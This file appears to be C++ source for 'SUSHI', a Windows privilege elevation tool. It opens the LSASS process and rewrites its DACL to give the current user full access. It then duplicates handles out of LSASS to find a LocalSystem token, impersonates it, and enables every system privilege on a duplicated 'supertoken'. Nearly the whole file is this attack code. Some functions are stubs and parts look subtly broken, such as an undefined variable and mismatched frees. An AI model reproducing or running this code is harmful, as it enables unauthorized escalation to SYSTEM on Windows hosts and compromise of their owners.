/*
	SUSHI - Windows privilege elevation tool
	Placed into the public domain by DilDog (dildog@l0pht.com)

	Tested on: 
		Windows XP Professional 64-bit Edition SP2
*/

#include<windows.h>
#include<tchar.h>
#include<stdarg.h>
//#include<LsaLookup.h>
#include<Ntsecapi.h>
#define SECURITY_WIN32
#include<security.h>
#include"_ntdll.h"
#include<tlhelp32.h>
#include"sushi.h"
#include"util/pviewer.h"

#include<string>
#ifdef UNICODE
typedef std::wstring _tstring;
#else
typedef std::string _tstring;
#endif


struct GetPIDCallbackContext
{
	std::wstring name;
	DWORD pid;
};

NTSTATUS NTAPI GetPIDEnumRoutine(PSYSTEM_PROCESS_INFORMATION CurrentProcess, PVOID CallbackContext)
{
	GetPIDCallbackContext *ctx=(GetPIDCallbackContext*)CallbackContext;

	bool bNameMatch=false;
	size_t len=ctx->name.size()*2;
	if(CurrentProcess->ProcessName.Length==len && 
	   wcscmp(CurrentProcess->ProcessName.Buffer,ctx->name.c_str())==0)
	{
		ctx->pid=(DWORD)CurrentProcess->ProcessID;
		return -1;
	}

	return STATUS_SUCCESS;
}



typedef int (__cdecl *PLOGGING_FUNCTION)(const TCHAR *, va_list);
PLOGGING_FUNCTION *m_logging_function;

CSushi::CSushi(PLOGGING_FUNCTION *plf)
{
	m_logging_function=plf;
}

int __cdecl _tprint(const TCHAR * _Format, ...)
{
	if(!m_logging_function)
	{
		return 0;
	}

	va_list args;
	va_start(args,_Format);

	int ret=(*m_logging_function)(_Format, args);

	va_end(args);

	return ret;
}


bool CSushi::ChangeProcessToken(DWORD dwProcessId, HANDLE hNewToken)
{
	// xxx

	return false;
}

DWORD CSushi::GetPID(const TCHAR *name)
{
	PROCESSINFO *pi=CreateProcListSnapshot(NULL);
	
	std::string asciiname;
#ifdef _UNICODE
	asciiname.assign(str.begin(),str.end());
#else
	asciiname.assign(name);
#endif

	PROCESSINFO *p=pi;

	while(p!=NULL)
	{
		if(strcmp(p->svApp,asciiname.c_str())==0)
		{
			DWORD dwProcID=p->dwProcID;
			DestroyProcListSnapshot(pi);
			return dwProcID;
		}
		p=p->next;
	}

	DestroyProcListSnapshot(pi);
	return 0;
}

DWORD CSushi::GetParentProcessId(void)
{
	// xxx
	return 0;
}


bool CSushi:: SetKernelObjectSD_DACL(HANDLE hObject,SECURITY_DESCRIPTOR *psd)
{
	return SetKernelObjectSecurity(hObject,DACL_SECURITY_INFORMATION,psd)!=0;
}

SECURITY_DESCRIPTOR *CSushi::GetKernelObjectSD_DACL(HANDLE hObject,DWORD *psdsize)
{
	DWORD sdlen=sizeof(SECURITY_DESCRIPTOR);
	SECURITY_DESCRIPTOR *psd=(SECURITY_DESCRIPTOR *)malloc(sdlen);
	if(!psd)
	{
		return NULL;
	}

	DWORD newsdlen;
	BOOL bSuccess;
	while(!(bSuccess=GetKernelObjectSecurity(hObject,DACL_SECURITY_INFORMATION,psd,sdlen,&newsdlen)) && 
		sdlen!=newsdlen)
	{
		SECURITY_DESCRIPTOR *newpsd=(SECURITY_DESCRIPTOR *)realloc(psd,newsdlen);
		if(!newpsd)
		{
			free(psd);
			return NULL;
		}
		psd=newpsd;
		sdlen=newsdlen;
	}

	DWORD abssdsize=sizeof(SECURITY_DESCRIPTOR),lastabssdsize=abssdsize;
	SECURITY_DESCRIPTOR *pabssd=(SECURITY_DESCRIPTOR *)malloc(abssdsize);
	DWORD daclsize=sizeof(ACL),lastdaclsize=daclsize;
	PACL pdacl=(PACL)malloc(daclsize);
	DWORD saclsize=sizeof(ACL),lastsaclsize=saclsize;
	PACL psacl=(PACL)malloc(saclsize);
	DWORD ownersize=sizeof(SID),lastownersize=ownersize;
	PSID powner=(PSID)malloc(ownersize);
	DWORD groupsize=sizeof(SID),lastgroupsize=groupsize;
	PSID pgroup=(PSID)malloc(groupsize);
	while(!MakeAbsoluteSD(psd,pabssd,&abssdsize,pdacl,&daclsize,psacl,&saclsize,powner,&ownersize,pgroup,&groupsize))
	{
		if(abssdsize!=lastabssdsize)
		{
			SECURITY_DESCRIPTOR *newpabssd=(SECURITY_DESCRIPTOR *)realloc(pabssd,abssdsize);
			if(!newpabssd)
			{
				free(pabssd);
				free(pdacl);
				free(psacl);
				free(powner);
				free(pgroup);
				free(psd);
				return NULL;
			}
			pabssd=newpabssd;
			lastabssdsize=abssdsize;
		}
		if(daclsize==0)
		{
			free(pdacl);
			pdacl=NULL;
		}
		else if(daclsize!=lastdaclsize)
		{
			PACL newpdacl=(PACL)realloc(pdacl,daclsize);
			if(!newpdacl)
			{
				free(pabssd);
				free(pdacl);
				free(psacl);
				free(powner);
				free(pgroup);
				free(psd);
				return NULL;
			}
			pdacl=newpdacl;
			lastdaclsize=daclsize;
		}
		if(saclsize==0)
		{
			free(psacl);
			psacl=NULL;
		}
		else if(saclsize!=lastsaclsize)
		{
			PACL newpsacl=(PACL)realloc(psacl,saclsize);
			if(!newpsacl)
			{
				free(pabssd);
				free(pdacl);
				free(psacl);
				free(powner);
				free(pgroup);
				free(psd);
				return NULL;
			}
			psacl=newpsacl;
			lastsaclsize=saclsize;
		}
		if(ownersize==0)
		{
			free(powner);
			powner=NULL;
		}
		else if(ownersize!=lastownersize)
		{
			PSID newpowner=(PSID)realloc(powner,ownersize);
			if(!newpowner)
			{
				free(pabssd);
				free(pdacl);
				free(psacl);
				free(powner);
				free(pgroup);
				free(psd);
				return NULL;
			}
			powner=newpowner;
			lastownersize=ownersize;
		}
		if(groupsize==0)
		{
			free(pgroup);
			pgroup=NULL;
		}
		else if(groupsize!=lastgroupsize)
		{
			PSID newpgroup=(PSID)realloc(pgroup,groupsize);
			if(!newpgroup)
			{
				free(pabssd);
				free(pdacl);
				free(psacl);
				free(powner);
				free(pgroup);
				free(psd);
				return NULL;
			}
			pgroup=newpgroup;
			lastgroupsize=groupsize;
		}
	}

	free(psd);

	if(psdsize)
	{
		*psdsize=abssdsize;
	}
	return pabssd;
}

void CSushi::FreeAbsoluteSD(SECURITY_DESCRIPTOR *psd)
{
	if(psd->Dacl)
		free(psd->Dacl);
	if(psd->Sacl)
		free(psd->Sacl);
	if(psd->Owner)
		free(psd->Owner);
	if(psd->Group)
		free(psd->Group);
	free(psd);
}

bool CSushi::EditAbsolute_AddAccessAllowedAce(PACL *ppacl,DWORD dwACLRevision,DWORD dwAccessMask,PSID psid)
{
	while(!AddAccessAllowedAce(*ppacl,dwACLRevision,dwAccessMask,psid))
	{
		if(GetLastError()==ERROR_ALLOTTED_SPACE_EXCEEDED)
		{
			DWORD dwNewSize=((DWORD)(*ppacl)->AclSize)+1024;
			if(dwNewSize>=65536)
			{
				return false;
			}
			PACL newacl=(PACL) realloc((*ppacl),(WORD)dwNewSize);
			if(!newacl)
			{
				return false;
			}
			(*ppacl)=newacl;
			(*ppacl)->AclSize=(WORD)dwNewSize;
		}
		else
		{
			return false;
		}
	}

	return true;
}

PSID CSushi::GetLocalSystemSID(DWORD *psidsize)
{
	SID_IDENTIFIER_AUTHORITY auth = SECURITY_NT_AUTHORITY;
	PSID pSid = NULL;

	if (!AllocateAndInitializeSid(&auth, 1, SECURITY_LOCAL_SYSTEM_RID, 0, 0, 0, 0, 0, 0, 0, &pSid)) 
	{
		return NULL;
	} 

	DWORD dwSize = 0;

	SID_NAME_USE eSidtype;
	DWORD        dwNameSize   = 0;
	DWORD        dwDomainSize = 0;      
	LPTSTR       pszName      = NULL;
	LPTSTR       pszDomain    = NULL;      

	LookupAccountSid(NULL, pSid, pszName, &dwNameSize, pszDomain, &dwDomainSize, &eSidtype);
	if (GetLastError() == ERROR_INSUFFICIENT_BUFFER) 
	{
		pszName   = (LPTSTR)LocalAlloc(LMEM_FIXED,dwNameSize * sizeof(TCHAR));
		if(!pszName)
		{
			return NULL;
		}
		pszDomain = (LPTSTR)LocalAlloc(LMEM_FIXED,dwDomainSize * sizeof(TCHAR));
		if(!pszDomain)
		{
			LocalFree(pszName);
			return NULL;
		}

		if (!::LookupAccountSid(NULL, pSid, pszName, &dwNameSize, pszDomain, &dwDomainSize, &eSidtype)) 
		{
			LocalFree(pszName);
			LocalFree(pszDomain);
			return NULL;
		}
	}
	else
	{
		return NULL;
	}

	if(_tcscmp(pszDomain,_T("NT AUTHORITY"))==0 &&
		_tcscmp(pszName,_T("SYSTEM"))==0)
	{
		LocalFree(pszName);
		LocalFree(pszDomain);

		if(psidsize)
		{
			*psidsize=GetLengthSid(pSid);
		}
		return pSid;
	}

	LocalFree(pszName);
	LocalFree(pszDomain);
	::FreeSid(pSid);
	return NULL;
}

PSID CSushi::GetUserSID(const TCHAR *username, DWORD *psidsize)
{
	DWORD reqd_sidsize=0;
	DWORD reqd_cchReferencedDomainName=0;
	SID_NAME_USE snu;

	if(LookupAccountName(NULL,username,NULL,&reqd_sidsize,NULL,&reqd_cchReferencedDomainName,&snu))
	{
		return NULL;
	}

	PSID psid=(PSID)LocalAlloc(LMEM_FIXED,reqd_sidsize);
	if(psid==NULL)
	{
		return NULL;
	}

	TCHAR *pdomainname=(TCHAR *)LocalAlloc(LMEM_FIXED,reqd_cchReferencedDomainName*sizeof(TCHAR));
	if(pdomainname==NULL)
	{
		FreeSid(psid);
		return NULL;
	}

	if(!LookupAccountName(NULL,username,psid,&reqd_sidsize,pdomainname,&reqd_cchReferencedDomainName,&snu))
	{
		FreeSid(psid);
		LocalFree(pdomainname);
		return NULL;
	}

	LocalFree(pdomainname);

	if(psidsize!=NULL)
	{
		*psidsize=reqd_sidsize;
	}

	return psid;
}

PSID CSushi::GetCurrentSID(DWORD *psidsize)
{
	TCHAR *pusername=(TCHAR *)LocalAlloc(LMEM_FIXED,1024*sizeof(TCHAR));
	DWORD usernamesize=1024;
	DWORD lastusernamesize=usernamesize;
	while(!GetUserName(pusername,&usernamesize))
	{
		if(GetLastError()==ERROR_MORE_DATA || GetLastError()==ERROR_INSUFFICIENT_BUFFER)
		{
			TCHAR *newpusername=(TCHAR *)LocalAlloc(LMEM_FIXED,usernamesize*sizeof(TCHAR));
			if(!newpusername)
			{
				free(pusername);
				return NULL;
			}
			memcpy(newpusername,pusername,lastusernamesize);
			pusername=newpusername;
			lastusernamesize=usernamesize;
		}
		else
		{
			LocalFree(pusername);
			return NULL;
		}
	}

	PSID psid=GetUserSID(pusername,psidsize);
	if(psid==NULL)
	{
		LocalFree(pusername);
		return NULL;
	}

	LocalFree(pusername);
	return psid;
}



bool CSushi::SetPrivilege(HANDLE hToken,  LPCTSTR Privilege, bool bEnablePrivilege)
{
	TOKEN_PRIVILEGES tp;
	LUID luid;
	TOKEN_PRIVILEGES tpPrevious;
	DWORD cbPrevious=sizeof(TOKEN_PRIVILEGES);

	if(!LookupPrivilegeValue( NULL, Privilege, &luid )) 
		return false;

	// 
	// first pass.  get current privilege setting
	// 
	tp.PrivilegeCount           = 1;
	tp.Privileges[0].Luid       = luid;
	tp.Privileges[0].Attributes = 0;

	AdjustTokenPrivileges(
		hToken,
		FALSE,
		&tp,
		sizeof(TOKEN_PRIVILEGES),
		&tpPrevious,
		&cbPrevious
		);

	if (GetLastError() != ERROR_SUCCESS) 
		return false;

	// 
	// second pass.  set privilege based on previous setting
	// 
	tpPrevious.PrivilegeCount       = 1;
	tpPrevious.Privileges[0].Luid   = luid;

	if(bEnablePrivilege) {
		tpPrevious.Privileges[0].Attributes |= (SE_PRIVILEGE_ENABLED);
	}
	else {
		tpPrevious.Privileges[0].Attributes ^= (SE_PRIVILEGE_ENABLED &
			tpPrevious.Privileges[0].Attributes);
	}

	AdjustTokenPrivileges(
		hToken,
		FALSE,
		&tpPrevious,
		cbPrevious,
		NULL,
		NULL
		);
	if (GetLastError() != ERROR_SUCCESS) 
		return false;

	return true;
} 

bool CSushi::GetDebugPrivilege()
{
	HANDLE hToken;
	if(!OpenThreadToken(GetCurrentThread(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, FALSE, &hToken))
	{
		if(GetLastError() == ERROR_NO_TOKEN)
		{
			if (!ImpersonateSelf(SecurityImpersonation))
			{
				return false;
			}

			if(!OpenThreadToken(GetCurrentThread(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, FALSE, &hToken))
			{
				return false;
			}
		}
		else
		{
			return false;
		}
	}

	// enable SeDebugPrivilege
	if(!SetPrivilege(hToken, SE_DEBUG_NAME, TRUE))
	{
		// close token handle
		CloseHandle(hToken);

		// indicate failure
		return false;
	}

	// close handles
	CloseHandle(hToken);

	return true;
}


bool CSushi::UnlockLSASS(LSASS_LOCK *lock)
{
	// Find LSASS
	DWORD dwLSAPID=GetPID(_T("lsass"));
	if(dwLSAPID==NULL)
	{
		return false;
	}

	// Get Debug Privilege
	if(!GetDebugPrivilege())
	{
	}

	// Open LSASS
	HANDLE hLSAProcess=OpenProcess(READ_CONTROL|WRITE_DAC,FALSE,dwLSAPID);
	if(hLSAProcess==NULL)
	{
		return false;
	}

	// Get process object DACL 
	DWORD sdsize;
	SECURITY_DESCRIPTOR *psd=GetKernelObjectSD_DACL(hLSAProcess,&sdsize);
	if(psd==NULL)
	{
		CloseHandle(hLSAProcess);
		return false;
	}

	// Get process object DACL again for backup
	DWORD sdsize_backup;
	SECURITY_DESCRIPTOR *psd_backup=GetKernelObjectSD_DACL(hLSAProcess,&sdsize_backup);
	if(psd_backup==NULL)
	{
		FreeAbsoluteSD(psd);
		CloseHandle(hLSAProcess);
		return false;
	}

	// Get SID for current user
	DWORD sidsize;
	PSID psid=GetCurrentSID(&sidsize);
	if(psid==NULL)
	{
		FreeAbsoluteSD(psd);
		CloseHandle(hLSAProcess);
		return false;
	}

	// Edit LSASS DACL to permit current user full access
	if(!EditAbsolute_AddAccessAllowedAce(&(psd->Dacl),ACL_REVISION,0xFFFFFFFF,psid))
	{
		FreeSid(psid);
		FreeAbsoluteSD(psd);
		FreeAbsoluteSD(psd_backup);
		CloseHandle(hLSAProcess);
		return false;
	}

	// Set process object DACL 
	if(!SetKernelObjectSD_DACL(hLSAProcess,psd))
	{
		DWORD dw=GetLastError();		

		FreeSid(psid);
		FreeAbsoluteSD(psd);
		FreeAbsoluteSD(psd_backup);
		CloseHandle(hLSAProcess);
		return false;
	}

	FreeSid(psid);
	FreeAbsoluteSD(psd);

	// Open LSASS with full permission set
	HANDLE hLSAProcessFull=OpenProcess(PROCESS_ALL_ACCESS,FALSE,dwLSAPID);
	if(hLSAProcessFull==NULL)
	{		
		// Restore LSASS process object DACL 
		if(!SetKernelObjectSD_DACL(hLSAProcess,psd_backup))
		{
			FreeAbsoluteSD(psd_backup);
			CloseHandle(hLSAProcess);
			return false;
		}

		FreeAbsoluteSD(psd_backup);
		CloseHandle(hLSAProcess);

		return false;
	}

	CloseHandle(hLSAProcess);

	lock->hLSAProcess=hLSAProcessFull;
	lock->psd_backup=psd_backup;

	return true;
}

bool CSushi::LockLSASS(LSASS_LOCK *lock)
{
	// Restore LSASS process object DACL 
	if(!SetKernelObjectSD_DACL(lock->hLSAProcess,lock->psd_backup))
	{
		FreeAbsoluteSD(lock->psd_backup);
		CloseHandle(lock->hLSAProcess);
		return false;
	}

	FreeAbsoluteSD(lock->psd_backup);
	CloseHandle(lock->hLSAProcess);

	memset(lock,0,sizeof(LSASS_LOCK));

	return true;
}




bool CSushi::ImpersonateUserToken(const TCHAR *username)
{
	// Get LocalSystem SID
	DWORD lssidsize;
	PSID plssid;
	plssid=GetLocalSystemSID(&lssidsize);
	if(plssid==NULL)
	{
		return false;
	}

	LSASS_LOCK lock;
	if(!UnlockLSASS(&lock))
	{
		FreeSid(plssid);
		return false;
	}



	// Find the first token for this process
	size_t dwCurHandle=0;
	HANDLE hLocalCurHandle=NULL;
	while(dwCurHandle<=0x400)
	{
		dwCurHandle+=4;

		if(DuplicateHandle(lock.hLSAProcess,(HANDLE)dwCurHandle,
			GetCurrentProcess(),&hLocalCurHandle,
			0,FALSE,DUPLICATE_SAME_ACCESS))
		{

			TOKEN_USER *ptokuser;
			DWORD tokuserlen;
			if(GetTokenInformation(hLocalCurHandle,TokenUser,NULL,0,&tokuserlen))
			{
				CloseHandle(hLocalCurHandle);
				continue;
			}
			ptokuser=(TOKEN_USER *)malloc(tokuserlen);
			if(ptokuser==NULL)
			{
				CloseHandle(hLocalCurHandle);
				continue;
			}
			if(!GetTokenInformation(hLocalCurHandle,TokenUser,ptokuser,tokuserlen,&tokuserlen))
			{
				free(ptokuser);
				CloseHandle(hLocalCurHandle);
				continue;
			}

			if(memcmp(ptokuser->User.Sid,plssid,sizeof(SID))==0)
			{
				free(ptokuser);
				break;
			}
			free(ptokuser);
		}
	}

	FreeSid(plssid);

	// Become the LSASS user for this thread
	if(!ImpersonateLoggedOnUser(hLocalCurHandle))
	{
		CloseHandle(hLocalCurHandle);

		if(!LockLSASS(&lock))
		{
			// non-fatal, but undesirable
		}

		return false;
	}

	// Duplicate this token and add all permissions to create a supertoken
	HANDLE hSuperToken;
	if(!DuplicateTokenEx(hLocalCurHandle,0,NULL,SecurityImpersonation,TokenPrimary,&hSuperToken))
	{
		RevertToSelf();	
		CloseHandle(hLocalCurHandle);

		if(!LockLSASS(&lock))
		{
			// non-fatal, but undesirable
		}

		return false;
	}

	// Modify this token to include all known permissions
	SetPrivilege(hSuperToken, SE_CREATE_TOKEN_NAME, TRUE);
	SetPrivilege(hSuperToken, SE_ASSIGNPRIMARYTOKEN_NAME, TRUE);
	SetPrivilege(hSuperToken, SE_LOCK_MEMORY_NAME, TRUE);
	SetPrivilege(hSuperToken, SE_INCREASE_QUOTA_NAME, TRUE);
	SetPrivilege(hSuperToken, SE_UNSOLICITED_INPUT_NAME, TRUE);
	SetPrivilege(hSuperToken, SE_MACHINE_ACCOUNT_NAME, TRUE);
	SetPrivilege(hSuperToken, SE_TCB_NAME, TRUE);
	SetPrivilege(hSuperToken, SE_SECURITY_NAME, TRUE);
	SetPrivilege(hSuperToken, SE_TAKE_OWNERSHIP_NAME, TRUE);
	SetPrivilege(hSuperToken, SE_LOAD_DRIVER_NAME, TRUE);
	SetPrivilege(hSuperToken, SE_SYSTEM_PROFILE_NAME, TRUE);
	SetPrivilege(hSuperToken, SE_SYSTEMTIME_NAME, TRUE);
	SetPrivilege(hSuperToken, SE_PROF_SINGLE_PROCESS_NAME, TRUE);
	SetPrivilege(hSuperToken, SE_INC_BASE_PRIORITY_NAME, TRUE);
	SetPrivilege(hSuperToken, SE_CREATE_PAGEFILE_NAME, TRUE);
	SetPrivilege(hSuperToken, SE_CREATE_PERMANENT_NAME, TRUE);
	SetPrivilege(hSuperToken, SE_BACKUP_NAME, TRUE);
	SetPrivilege(hSuperToken, SE_RESTORE_NAME, TRUE);
	SetPrivilege(hSuperToken, SE_SHUTDOWN_NAME, TRUE);
	SetPrivilege(hSuperToken, SE_DEBUG_NAME, TRUE);
	SetPrivilege(hSuperToken, SE_AUDIT_NAME, TRUE);
	SetPrivilege(hSuperToken, SE_SYSTEM_ENVIRONMENT_NAME, TRUE);
	SetPrivilege(hSuperToken, SE_CHANGE_NOTIFY_NAME, TRUE);
	SetPrivilege(hSuperToken, SE_REMOTE_SHUTDOWN_NAME, TRUE);
	SetPrivilege(hSuperToken, SE_UNDOCK_NAME, TRUE);
	SetPrivilege(hSuperToken, SE_SYNC_AGENT_NAME, TRUE);
	SetPrivilege(hSuperToken, SE_ENABLE_DELEGATION_NAME, TRUE);
	SetPrivilege(hSuperToken, SE_MANAGE_VOLUME_NAME, TRUE);
	SetPrivilege(hSuperToken, SE_IMPERSONATE_NAME, TRUE);
	SetPrivilege(hSuperToken, SE_CREATE_GLOBAL_NAME, TRUE);
	SetPrivilege(hSuperToken, SE_TRUSTED_CREDMAN_ACCESS_NAME, TRUE);
	SetPrivilege(hSuperToken, SE_RELABEL_NAME, TRUE);
	SetPrivilege(hSuperToken, SE_INC_WORKING_SET_NAME, TRUE);
	SetPrivilege(hSuperToken, SE_TIME_ZONE_NAME, TRUE);
	SetPrivilege(hSuperToken, SE_CREATE_SYMBOLIC_LINK_NAME, TRUE);

	// If we're looking for LocalSystem, then we're it.
	if(username==NULL)
	{
		if(!ImpersonateLoggedOnUser(hSuperToken))
		{
			if(!LockLSASS(&lock))
			{
				// non-fatal, but undesirable
			}
			return false;
		}

		if(!LockLSASS(&lock))
		{
			// non-fatal, but undesirable
		}
		return true;
	}

	// Get user SID
	DWORD usidsize;
	PSID usid=GetUserSID(username,&usidsize);
	if(!usid)
	{
		if(!LockLSASS(&lock))
		{
			// non-fatal, but undesirable
		}
		return false;
	}


	// If we're looking for a particular user, create a token for them
	//HANDLE hUserToken;
	LUID systemluid=SYSTEM_LUID;
	TOKEN_USER user;
	user.User.Attributes=0;
	user.User.Sid=usid;
	//TOKEN_GROUP group;
	//group.

	LSA_OBJECT_ATTRIBUTES loa;
	memset(&loa,0,sizeof(loa));
	LSA_HANDLE hPolicy;
	if(!NT_SUCCESS(LsaOpenPolicy(NULL,&loa,POLICY_ALL_ACCESS,&hPolicy)))
	{
		FreeSid(usid);
		if(!LockLSASS(&lock))
		{
			// non-fatal, but undesirable
		}
		return false;
	}



	LsaClose(hPolicy);


	//ZwCreateToken(&hUserToken,TOKEN_ALL_ACCESS,NULL,TokenPrimary,&systemluid,-1,




	if(!LockLSASS(&lock))
	{
		// non-fatal, but undesirable
	}

	return true;
}

bool CSushi::ImpersonateUser(HANDLE hToken)
{

	return true;
}

bool CSushi::CreateProcessWithToken(HANDLE hToken, const TCHAR *cmdline)
{
	// Need to become LocalSystem with max privs to do CreateProcessWithToken
	if(!ImpersonateUser(NULL))
	{
		_tprint(_T("Unable to impersonate account 'LocalSystem'.\n\r")
			_T("You may not have permissions to perform this action.\n\r"));
		return false;
	}

	// xxx

	RevertToSelf();
	return true;
}


